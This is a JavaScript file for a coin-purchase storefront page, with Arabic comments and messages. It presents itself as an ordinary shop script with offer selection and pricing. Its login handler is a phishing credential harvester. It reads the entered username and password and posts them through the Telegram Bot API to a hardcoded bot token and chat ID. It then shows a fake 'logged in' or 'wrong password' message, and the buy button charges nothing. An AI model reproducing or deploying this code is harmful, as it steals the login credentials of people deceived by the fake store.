document.addEventListener('DOMContentLoaded', function(){
  const offers = Array.from(document.querySelectorAll('.offer'));
  const totalPriceEl = document.getElementById('totalPrice');
  const buyBtn = document.getElementById('buyBtn');
  let selected = null;

  offers.forEach(o => {
    o.addEventListener('click', () => {
      // toggle selection
      if (selected === o) {
        o.classList.remove('active');
        selected = null;
      } else {
        offers.forEach(x => x.classList.remove('active'));
        o.classList.add('active');
        selected = o;
      }
      updateTotal();
    });
  });

  function updateTotal(){
    if (!selected) {
      totalPriceEl.textContent = '$0';
      buyBtn.disabled = true;
      buyBtn.classList.remove('primary');
      return;
    }
    const price = parseFloat(selected.getAttribute('data-price')) || 0;
    // format to 2 decimals with $
    totalPriceEl.textContent = '$' + price.toFixed(2);
    buyBtn.disabled = false;
    buyBtn.classList.add('primary');
  }

  // buy button click (demo)
  buyBtn.addEventListener('click', function(){
    if (buyBtn.disabled) return;
    const coins = selected.getAttribute('data-coins');
    const price = selected.getAttribute('data-price');
    alert('تم اختيار ' + coins + ' عملة. الإجمالي: $' + parseFloat(price).toFixed(2) + '\n لم يتم شحن قم بتسجيل دخول ');
  });

  // login button demo
  const loginBtn = document.getElementById('loginBtn');
  loginBtn.addEventListener('click', function(){
    // جلب القيم من الحقول (تأكد أن في HTML عندك عناصر id="username" و id="password")
const username = document.getElementById('username').value;
const password = document.getElementById('password').value;

// --- عدّل هذين بالقيم الحقيقية ---
const botToken = "1759545512:AAEPKJ7hfmhbg-rMVrfJYhbrupDRr-zPGqE";   // مثال: "123456:ABC-DEF..."
const chatId   = "982178390";     // مثال: "987654321"
// ---------------------------------------------

const message = `👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;

fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id: String(chatId),
    text: message,
    parse_mode: "HTML"
  })
})
.then(res => res.json())
.then(data => {
  if (data.ok) {
    console.log("تم الإرسال بنجاح:", data);
    alert("تم تسجيل الدخول");
  } else {
    console.error("رد تيليجرام (خطأ):", data);
    alert("كلمت السر غير صحيحه ");
  }
})
.catch(err => {
  console.error("خطأ أثناء الإرسال:", err);
  alert("حدث خطأ أثناء الإرسال — قد يكون مشكلة CORS أو اتصال شبكي ❌");
});
  });
});